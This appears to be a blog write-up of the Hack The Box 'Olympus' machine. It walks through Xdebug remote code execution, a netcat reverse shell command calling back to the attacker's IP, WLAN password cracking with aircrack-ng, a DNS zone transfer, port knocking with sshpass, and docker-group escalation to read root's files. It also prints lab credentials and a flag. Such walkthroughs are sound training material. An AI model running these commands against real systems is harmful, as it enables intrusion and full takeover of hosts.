---
date: 2019-08-15
title: 'Hack The Box - Olympus Writeup'
template: post
categories:
 - HTB
tags:
 - HTB
---

I begun by scanning the box to find some interesting ports.

```
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
80/tcp   open     http    Apache httpd
2222/tcp open     ssh     (protocol 2.0)
```

Port 80 was open so I visited the site and found a picture of the almighty God Zeus. I checked the response headers in the developer console and noticed the `xdebug` variable. According to my google fu, it's a PHP debugger which among other things, can be used to debug [*remote*](https://xdebug.org/docs/remote) PHP applications. 

I continued to recon the web for more info and found the following links:

[https://github.com/rapid7/metasploit-framework/pull/9916](https://github.com/rapid7/metasploit-framework/pull/9916)

[https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface](https://github.com/rapid7/metasploit-framework/pull/9916)

I used the script found in the last link. All you need to do is to setup a GET parameter and specify your attack IP in `X-FORWARDED-FOR`. I ran the `xdebug.py` script and sent the following HTTP request:

```
GET /index.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: 10.10.10.83
User-Agent: Mozilla/5.0 (X11; Windows x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-FORWARDED-FOR: 10.10.14.7
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

The machine connected back to my attack machine! Next I setup a listener `nc -lvp 1337` and ran the following command from `xdebug.py`: `system("nc -e /bin/bash 10.10.10.14.7 1337")` which ran on the victim's box and created a reverse shell for me to use.

### WHAT'S IN THE BOX!?!?
After gaining access I looked for `user.txt` but couldn't find it. After checking the home folder of `zeus`, checking the process list with `ps aux` and checking the root directory, I started to think this must be a docker container. I uploaded `linenum.sh` which later also reported to believe that the host was actually a docker container.

The user `zeus` had downloaded the project `airgeddon` from github which is a tool for attacking wireless networks. Inside the project I found a .pcap file and a .txt file with the following message:

```
Captured while flying. I'll banish him to Olympia - Zeus
```

I opened the .pcap file and realised it was encrypted WLAN traffic, so I fired up `aircrack-ng` and got crackin! After 40 minutes using `rockyou.txt` as my wordlist, I found the password: `flightoficarus`. Inside the .pcap I could see clients connecting to an accesspoint called: `Too_cl0se_to_th3_Sun`.

I continued to scan the .pcap for more information but couldn't find anything. So I begun trying to SSH into the machine at port 2222 with different credentials, using greek methodology as my starting point. Everything I tried failed. One week later I try the same credentials again and voila, I had access. Why this didn't work the first time, I don't know. My guess is that people were hammering the machine hard so I timed out.

```
icarus:Too_cl0se_to_th3_Sun
```

Turned out this was an other docker container, I deduced that from the hostname and process list. There was only one file available, which had the following contents:

```

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb

```

Okey, so now I have a new domain, and port 53/tcp was open according to my port scan, that can only mean one thing...DNZ ZONE TRANSFER!

First I ran the following:

```
root@kali:~/Sites/htb-notes/olympus/http_serve# host -l ctfolympus.htb 10.10.10.83
Using domain server:
Name: 10.10.10.83
Address: 10.10.10.83#53
Aliases: 

ctfolympus.htb has address 192.168.0.120
ctfolympus.htb name server ns1.ctfolympus.htb.
ctfolympus.htb name server ns2.ctfolympus.htb.
mail.ctfolympus.htb has address 192.168.0.120
ns1.ctfolympus.htb has address 192.168.0.120
ns2.ctfolympus.htb has address 192.168.0.120
```

Okey nice, lets run the dns zone transfer!

```
root@kali:~/Sites/htb-notes/olympus/http_serve# dig axfr @ctfolympus.htb ctfolympus.htb

; <<>> DiG 9.11.3-1-Debian <<>> axfr @ctfolympus.htb ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.		86400	IN	A	192.168.0.120
ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 46 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 14 19:27:19 CEST 2018
;; XFR size: 15 records (messages 1, bytes 475)
```

DNS zone transfer lets us get a copy of the zone file, so now we can see everything! The thing that stood out the most was:

```
ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
```

My thinking here was that the user `prometheus` needs to perform port knocking which will then open allow us to login via ssh on port 22, which was set to filtered according to my port scan.

Easy peasy one liner:

```
for port in 3456 8234 62431; do nc ctfolympus.htb $port 2> /dev/null; done; sshpass -p 'St34l_th3_F1re!' ssh -o "StrictHostKeyChecking no" prometheus@ctfolympus.htb
```

`sshpass` is a package which allows you to set the SSH password as an input parameter.

```bash
Welcome to
                            
    )         (             
 ( /(     )   )\ )   (      
 )\()) ( /(  (()/(  ))\ (   
((_)\  )(_))  ((_))/((_))\  
| |(_)((_)_   _| |(_)) ((_) 
| ' \ / _` |/ _` |/ -_)(_-< 
|_||_|\__,_|\__,_|\___|/__/ 
                           
prometheus@olympus:~$
```

Aww yeee, we got access to the host machine and not some stupid container! Since I knew the host was running docker, I tried some commands to see what I could do, and to my surprise, I could do anything!

In order to get `root.txt`, all we need to do is to simply start a container and map root's home directory into the container. First I tried to use a ubuntu image but that didn't work, so I checked `docker images` and picked one from there.

```
prometheus@olympus:~$ docker run --volume=/root:/volumes -i -t olympia /bin/bash
root@1c2a720c4fa5:/#
root@1c2a720c4fa5:/# ls /volumes/
root.txt
root@1c2a720c4fa5:/# cat /volumes/root.txt 
aba486990e2e849e25c23f6e41e5e303
root@1c2a720c4fa5:/#
```

And there you go.